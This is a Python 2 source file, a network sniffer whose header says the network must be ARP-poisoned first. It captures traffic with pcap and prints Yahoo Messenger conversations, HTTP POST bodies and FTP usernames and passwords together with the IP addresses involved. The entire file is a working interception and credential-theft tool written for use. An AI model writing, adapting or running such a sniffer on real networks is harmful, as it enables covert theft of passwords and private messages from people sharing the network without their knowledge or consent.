#! /usr/bin/python
#
# A simple python sniffer by zepvn. You need to ARP poison your nerwork first.
# Protocol supported: YMSG, HTTP(POST) and FTP
# 
#

import pcap
import sys
import string
import time
import socket
import struct
import re

CAP_ALL  = 7
CAP_YMSG = 1
CAP_POST = 2
CAP_FTP  = 4
mode = CAP_ALL

http_requests = {}

def get_tcp_info(s):
    ip_header_len = ord(s[0]) & 0x0f
    tcp_packet = s[4*ip_header_len:]
    tcp_header_len = ord(tcp_packet[12]) >> 4
    src_port = (ord(tcp_packet[0])<<8) + ord(tcp_packet[1])
    dest_port = (ord(tcp_packet[2])<<8) + ord(tcp_packet[3])
    payload = tcp_packet[4*tcp_header_len:]
    return src_port, dest_port, payload

def parse_ymsg(payload):
    content = payload[20:]
    l = content.split('\xc0\x80')    
    size = len(l)
    sender = receiver = message = ''
#    print l
    for i in xrange(0,size,2) :
        if ( (l[i] == '1') and (sender =='') ) :
            sender = l[i+1]
        elif ( (l[i] == '5') and (receiver == '') ) :
            receiver = l[i+1]
        elif ( (l[i] == '14') and (message == '') ) :
            message = l[i+1]
    p = re.compile('.\[\d\dm')
    return sender + ' - ' + receiver + ' : ' + p.sub('',message)

def parse_partial_http_post(src_port, payload):
    cur_time = time.mktime(time.localtime())
    if cur_time - http_requests[src_port]['time'] < 10:
        http_requests[src_port]['content'] += payload
    if len(http_requests[src_port]['content']) >= http_requests[src_port]['len']:
        data = http_requests[src_port]['post'] + '\n' + http_requests[src_port]['host'] + http_requests[src_port]['content']
        http_requests.pop(src_port)
        return data

def parse_http_post(src_port, payload):

    p = re.compile('POST(.*?)\r\n')
    post = p.search(payload)
    if (post == None) :
        return None
    post = post.group(1)

    p = re.compile('Host:.*?\r\n')
    host = p.search(payload)
    if (host == None) :
        return None
    host = host.group(0)

    p = re.compile('Content-Length: (.*?)\r\n')
    content_len = p.search(payload)
    if (content_len == None) :
        return None
    content_len = int(content_len.group(1))

    if (content_len > 500) :
        return None

    p = re.compile('\r\n\r\n(.*)$')
    content = p.search(payload)
    if content == None :
        return None
    
    content = content.group(1)
    if len(content) < content_len:
        http_requests[src_port] = {'time': time.mktime(time.localtime()),'post': post, 'host': host, 'len': content_len, 'content':content}
    else:
        return post + '\n' + host + content


def print_packet(pktlen, data, timestamp):

    if not data:
        return
    
    if data[12:14]=='\x08\x00':
        src_port, dest_port, payload = get_tcp_info(data[14:])
    else :
        return

    prefix = payload[:4]
    
#    print prefix

    if (mode & CAP_YMSG) and (prefix == 'YMSG') and (len(payload)>11) and (ord(payload[10]) == 0) and (ord(payload[11]) == 6) :
        print 'YMSG :: %s - %s' % (pcap.ntoa(struct.unpack('i',data[26:30])[0]) , parse_ymsg(payload))

    elif mode & CAP_POST: 
        content = None
        if prefix == 'POST' :
            content = parse_http_post(src_port, payload)
        elif http_requests.has_key(src_port):
            content = parse_partial_http_post(src_port, payload)
        if (content != None) :
                print 'POST :: %s - %s : %s \n'  % (pcap.ntoa(struct.unpack('i',data[26:30])[0]),pcap.ntoa(struct.unpack('i',data[30:34])[0]), content)
                
    elif (mode & CAP_FTP) and (prefix == 'USER') :
            print 'FTP :: %s - %s : %s'  % (pcap.ntoa(struct.unpack('i',data[26:30])[0]),pcap.ntoa(struct.unpack('i',data[30:34])[0]), payload)
            
    elif (mode & CAP_FTP) and (prefix == 'PASS') :
            print 'FTP :: %s - %s : %s'  % (pcap.ntoa(struct.unpack('i',data[26:30])[0]),pcap.ntoa(struct.unpack('i',data[30:34])[0]), payload)

def main() :
    global mode

    if len(sys.argv) < 2:
        print 'usage: %s <interface> ' % sys.argv[0]
        sys.exit(0)

    # MAIN PROGRAM
    if (len(sys.argv) >= 3) :
        if sys.argv[2] == 'ymsg' :
            mode = CAP_YMSG
        elif sys.argv[2] == 'post' :
            mode = CAP_POST
        elif sys.argv[2] == 'ftp' :
            mode = CAP_FTP

    p = pcap.pcapObject()
    dev = sys.argv[1]
    net, mask = pcap.lookupnet(sys.argv[1])

    p.open_live(dev, 1600, 1, 100)
    p.setfilter('tcp', 0, 0)

    p.setnonblock(1)
    p.loop(0, print_packet)

if __name__ == '__main__':
    main()


